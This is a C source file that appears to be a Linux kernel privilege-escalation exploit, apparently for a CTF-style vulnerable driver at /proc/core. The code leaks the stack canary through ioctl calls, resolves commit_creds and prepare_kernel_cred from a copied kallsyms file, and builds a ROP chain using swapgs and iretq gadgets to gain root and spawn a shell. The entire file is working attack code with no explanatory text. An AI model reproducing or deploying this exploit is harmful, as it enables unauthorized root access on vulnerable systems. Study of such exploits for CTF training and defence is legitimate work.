#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t vmlinux_base, offset, commit_creds, prepare_kernel_cred;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

size_t rop[0x100] = {0};
size_t user_buf[8] = {0};

void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
}

void get_shell()
{
	if (getuid() == 0)
	{
		system("/bin/sh");
	}
	else
	{
		puts("[-] get shell error");
		exit(1);
	}
}

void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred;
	void (*cc)(char*) = commit_creds;
	(*cc)((*pkc)(0));
}

int find_symbols()
{
	char buf[0x40]={0};

	FILE *fd = fopen("/tmp/kallsyms","r");
	if(fd == 0)
	{
		puts("[-] open /kallsyms error");
		exit(0);
	}
	
	while(fgets(buf, 0x40, fd))
	{
		if(commit_creds && prepare_kernel_cred)
		{
			printf("[+] find commit_creds: %p\n", commit_creds);
			printf("[+] find prepare_kernel_cred: %p\n", prepare_kernel_cred);
			return 0;
		}
		
		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			char ptr[0x20]={0};
			strncpy(ptr, buf ,16);
			sscanf(ptr, "%lx", &commit_creds);
		}
		
		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			char ptr[0x20]={0};
			strncpy(ptr, buf ,16);
			sscanf(ptr, "%lx", &prepare_kernel_cred);	
		}
	}
	
	return 0;
}

void main()
{
	save_status();
	int i = 0;
	int fd = open("/proc/core",2);
	if(fd == 0)
	{
		puts("[-] open file error");
		exit(0);
	}

	find_symbols();

	vmlinux_base = commit_creds - 0x9c8e0;
	size_t offset = vmlinux_base - 0xffffffff81000000;

	ioctl(fd, 0x6677889C, 0x40);
	ioctl(fd, 0x6677889B, user_buf);

	for(i=0;i<8;i++)
		printf("%d: %p\n", i, user_buf[i]);
	size_t canary = user_buf[0];
	printf("[+] find canary: %p\n", canary);
	
	i = 8;
	
	//commit_creds(prepare_kernel_cred(0))
	rop[i++] = canary;
	rop[i++] = 0; //rbp
	rop[i++] = (size_t)get_root;
	rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;
	rop[i++] = 0;
	rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
	
	puts("debug");
	getchar();
	
	write(fd, rop, 0x100);
	getchar();
	ioctl(fd, 0x6677889A, 0x100 | 0xFFFFFFFFFFFF0000);
}
